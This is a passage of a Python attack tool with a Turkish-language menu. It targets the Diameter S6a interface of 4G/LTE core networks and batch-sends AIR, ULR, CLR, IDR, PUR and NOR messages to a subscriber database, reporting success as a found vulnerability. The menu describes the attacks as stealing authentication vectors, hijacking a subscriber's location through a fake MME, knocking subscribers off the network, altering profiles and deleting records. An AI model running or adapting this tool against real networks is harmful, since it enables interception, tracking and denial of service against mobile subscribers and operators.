    origin_realm = get_input("Origin-Realm", "test.com")
    dest_host = get_input("Destination-Host", "hss.target.com")
    dest_realm = get_input("Destination-Realm", "target.com")
    imsi = get_input("Hedef IMSI", "286011234567890")
    visited_plmn = get_input("Visited-PLMN-ID (hex)", "28601")

    plmn_bytes = bytes.fromhex(visited_plmn.ljust(6, '0')[:6])

    attacks = [
        ("AIR", build_air(imsi, origin_host, origin_realm, dest_host, dest_realm, plmn_bytes)),
        ("ULR", build_ulr(imsi, origin_host, origin_realm, dest_host, dest_realm, plmn_bytes)),
        ("CLR", build_clr(imsi, origin_host, origin_realm, dest_host, dest_realm)),
        ("IDR", build_idr(imsi, origin_host, origin_realm, dest_host, dest_realm)),
        ("PUR", build_pur(imsi, origin_host, origin_realm, dest_host, dest_realm)),
        ("NOR", build_nor(imsi, origin_host, origin_realm, dest_host, dest_realm)),
    ]

    print(f"\n[+] {len(attacks)} saldiri tipi test edilecek...\n")
    results_summary = []

    for name, msg in attacks:
        print(f"\n{'='*40}")
        print(f"[>] {name} testi baslatiliyor...")
        result = _send_diameter(remote_ip, remote_port, origin_host, origin_realm, msg, name)

        status = "TIMEOUT"
        if result:
            rc = result.get('result_code', 0)
            if rc == 2001:
                status = "ZAFIYET BULUNDU"
            elif rc > 0:
                status = f"REDDEDILDI (RC={rc})"
            else:
                status = "YANIT ALINDI (RC bilinmiyor)"
        results_summary.append((name, status))
        time.sleep(0.5)

    # Summary
    print("\n\n" + "=" * 60)
    print(" TOPLU TEST SONUCLARI")
    print("=" * 60)
    for name, status in results_summary:
        if "ZAFIYET" in status:
            color = "\033[31m"
        elif "REDDEDILDI" in status:
            color = "\033[33m"
        else:
            color = "\033[37m"
        print(f"  {name:8s} : {color}{status}\033[0m")
    print("=" * 60)

    # Save summary
    try:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"diameter_batch_{ts}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"Diameter Toplu Test - {remote_ip}:{remote_port}\n")
            f.write(f"IMSI: {imsi}\n")
            f.write(f"Tarih: {ts}\n\n")
            for name, status in results_summary:
                f.write(f"{name}: {status}\n")
        print(f"\n[+] Sonuclar kaydedildi: {fname}")
    except Exception:
        pass

    input("\nDevam etmek icin Enter'a basin...")
    diameter_menu()


# ============================================
# MENU
# ============================================

def diameter_menu():
    """Diameter saldiri ana menusu."""
    os.system('cls' if os.name == 'nt' else 'clear')

    print("=" * 60)
    print(" Diameter Protokol Saldirilari (4G/LTE - S6a Arayuzu)")
    print("=" * 60)
    print()
    print("  Saldiri                  Aciklama")
    print("  --------                 --------------------")
    print("  0) CER Baglanti Testi    Diameter nodu kesfetme")
    print("  1) AIR Auth Cekme        Kimlik dogrulama vektoru cekme")
    print("  2) ULR Lokasyon Ele G.   Sahte MME ile abone yonlendirme")
    print("  3) CLR Lokasyon Iptal    Aboneyi sebekeden dusurme (DoS)")
    print("  4) IDR Profil Degist.    Abone verisini degistirme")
    print("  5) PUR Abone Silme       HSS'den abone kaydini silme")
    print("  6) NOR Bildirim          HSS'ye sahte bildirim")
    print("  7) Toplu Test            Tum saldirilari sirayla dene")
    print()
    print("  Geri donmek icin 'back' yazin")
    print()

    choice = input("\033[37m(\033[0m\033[2;31mdiameter\033[0m\033[37m)>\033[0m ")

    if choice == "0":
        _cer_attack()
    elif choice == "1":
        _air_attack()
    elif choice == "2":
        _ulr_attack()
    elif choice == "3":
        _clr_attack()
    elif choice == "4":
        _idr_attack()
    elif choice == "5":
        _pur_attack()
    elif choice == "6":
        _nor_attack()
    elif choice == "7":
        _batch_test()
    elif choice == "back" or choice == "geri":
        return
    else:
        print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0-7)')
        time.sleep(1.5)
        diameter_menu()


if __name__ == "__main__":
    diameter_menu()
